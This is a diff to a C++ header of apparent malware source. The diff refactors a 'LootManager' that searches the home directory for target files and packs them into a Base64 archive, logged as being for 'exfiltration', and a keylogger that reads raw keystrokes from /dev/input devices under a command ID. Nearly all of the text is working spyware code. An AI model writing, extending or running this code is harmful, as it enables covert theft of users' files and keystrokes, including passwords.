@@ -1,29 +1,25 @@
 #pragma once
 
+#include "ExfilEnvelope.hpp"
+#include "LootArchive.hpp"
 #include "Util/SafeLogger.hpp"
 
 #include <atomic>
+#include <chrono>
 #include <exception>
 #include <fcntl.h>
 #include <filesystem>
-#include <thread>
-#include <vector>
-#include <string>
-#include <regex>
+#include <fstream>
 #include <linux/input.h>
-#include <fcntl.h>
+#include <mutex>
+#include <regex>
+#include <string>
+#include <thread>
 #include <unistd.h>
 #include <vector>
-#include <string>
-#include <thread>
-#include <atomic>
-#include <mutex>
 
 namespace fs = std::filesystem;
 
-//-------------------------------------------------
-//
-//-------------------------------------------------
 class LootManager {
 public:
     struct TargetPattern {
@@ -31,9 +27,6 @@ public:
         std::regex pattern;
     };
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     [[nodiscard]]
     static std::vector<fs::path> scan_for_loot() {
         std::vector<fs::path> found_files;
@@ -48,8 +41,15 @@ public:
         std::string search_root = home ? home : "/home";
 
         try {
-            for (const auto& entry : fs::recursive_directory_iterator(search_root, fs::directory_options::skip_permission_denied)) {
-                if (not entry.is_regular_file()) continue;
+            for (const auto& entry : fs::recursive_directory_iterator(
+                     search_root, fs::directory_options::skip_permission_denied)) {
+                if (not entry.is_regular_file()) {
+                    continue;
+                }
+
+                if (found_files.size() >= exfil::kMaxLootFiles) {
+                    break;
+                }
 
                 std::string filename = entry.path().filename().string();
                 for (const auto& target : targets) {
@@ -66,39 +66,6 @@ public:
         return found_files;
     }
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
-    [[nodiscard]]
-    static std::string encode_archive(const std::vector<unsigned char>& data) {
-        static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-        std::string out;
-
-        int val = 0;
-        int valb = -6;
-        for (unsigned char c : data) {
-            val = (val << 8) + c;
-            valb += 8;
-            while (valb >= 0) {
-                out.push_back(base64_chars[(val >> valb) & 0x3F]);
-                valb -= 6;
-            }
-        }
-
-        if (valb > -6) {
-            out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
-        }
-
-        while (out.size() % 4) {
-            out.push_back('=');
-        }
-
-        return out;
-    }
-
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     [[nodiscard]]
     static std::string execute_loot_command() {
         logger::info("Starting loot scan...");
@@ -111,79 +78,74 @@ public:
 
         logger::debug("Found {} files for exfiltration", files.size());
 
-        std::vector<unsigned char> archive_buffer;
+        std::vector<loot_archive::LootFileEntry> entries;
+        std::size_t total_bytes = 0;
 
         for (const auto& path : files) {
-            std::ifstream file(path, std::ios::binary);
-
+            std::ifstream file(path, std::ios::binary | std::ios::ate);
             if (not file.is_open()) {
                 continue;
             }
 
-            std::vector<unsigned char> file_data((std::istreambuf_iterator<char>(file)),
-                                                std::istreambuf_iterator<char>());
+            const auto file_size = static_cast<std::size_t>(file.tellg());
+            if (file_size > exfil::kMaxLootFileBytes) {
+                continue;
+            }
+            if (total_bytes + file_size > exfil::kMaxLootTotalBytes) {
+                break;
+            }
 
-            std::string path_str = path.string();
-            uint32_t path_len = path_str.length();
-            uint32_t data_len = file_data.size();
+            file.seekg(0);
+            loot_archive::LootFileEntry entry;
+            entry.path = path.string();
+            entry.data.resize(file_size);
+            if (!file.read(reinterpret_cast<char*>(entry.data.data()), static_cast<std::streamsize>(file_size))) {
+                continue;
+            }
 
-            // Append to buffer
-            auto append_uint32 = [&](uint32_t val) {
-                archive_buffer.push_back((val >> 24) & 0xFF);
-                archive_buffer.push_back((val >> 16) & 0xFF);
-                archive_buffer.push_back((val >> 8) & 0xFF);
-                archive_buffer.push_back(val & 0xFF);
-            };
+            total_bytes += file_size;
+            entries.push_back(std::move(entry));
+            logger::debug("Added {} ({} bytes)", path.filename().string(), file_size);
+        }
 
-            append_uint32(path_len);
-            archive_buffer.insert(archive_buffer.end(), path_str.begin(), path_str.end());
-
-            append_uint32(data_len);
-            archive_buffer.insert(archive_buffer.end(), file_data.begin(), file_data.end());
-
-            logger::debug("Added {} ({} bytes)", path.filename().string(), data_len);
+        if (entries.empty()) {
+            return "";
         }
 
         logger::info("Encoding archive to Base64...");
-        return encode_archive(archive_buffer);
+        return loot_archive::encode_base64_archive(entries);
     }
 };
 
-//-------------------------------------------------
-//
-//-------------------------------------------------
 class Keylogger {
 private:
     std::atomic<bool> running{false};
     std::thread worker;
     std::vector<std::string> key_buffer;
     std::mutex buffer_mutex;
+    std::string active_command_uid_;
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     std::string keycode_to_str(int code) {
         static const char* map[] = {
             "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
             "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CTRL",
             "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT", "KPA*", "L_ALT", "SPACE"
         };
-        if (code >= 0 && code < (int)(sizeof(map) / sizeof(map[0]))) return map[code];
+        if (code >= 0 && code < static_cast<int>(sizeof(map) / sizeof(map[0]))) {
+            return map[code];
+        }
         return "[UNKNOWN]";
     }
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     void log_loop() {
-        // Find the keyboard device. On many systems, /dev/input/event3 or event4.
-        // A better way is to parse /proc/bus/input/devices
         int fd = open("/dev/input/event4", O_RDONLY);
         if (fd == -1) {
             fd = open("/dev/input/event3", O_RDONLY);
         }
 
-        if (fd == -1) return;
+        if (fd == -1) {
+            return;
+        }
 
         struct input_event ev;
         while (running) {
@@ -199,26 +161,23 @@ private:
     }
 
 public:
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
-    void start() {
-        if (running) return;
+    void start(const std::string& command_uid) {
+        if (running) {
+            return;
+        }
+        active_command_uid_ = command_uid;
         running = true;
         worker = std::thread(&Keylogger::log_loop, this);
     }
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     void stop() {
         running = false;
-        if (worker.joinable()) worker.join();
+        if (worker.joinable()) {
+            worker.join();
+        }
+        active_command_uid_.clear();
     }
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     std::vector<std::string> collect_and_clear() {
         std::lock_guard<std::mutex> lock(buffer_mutex);
         std::vector<std::string> output = std::move(key_buffer);
@@ -226,10 +185,11 @@ public:
         return output;
     }
 
-    //-------------------------------------------------
-    //
-    //-------------------------------------------------
     bool is_running() const {
         return running;
+    }
+
+    [[nodiscard]] const std::string& active_command_uid() const {
+        return active_command_uid_;
     }
 };
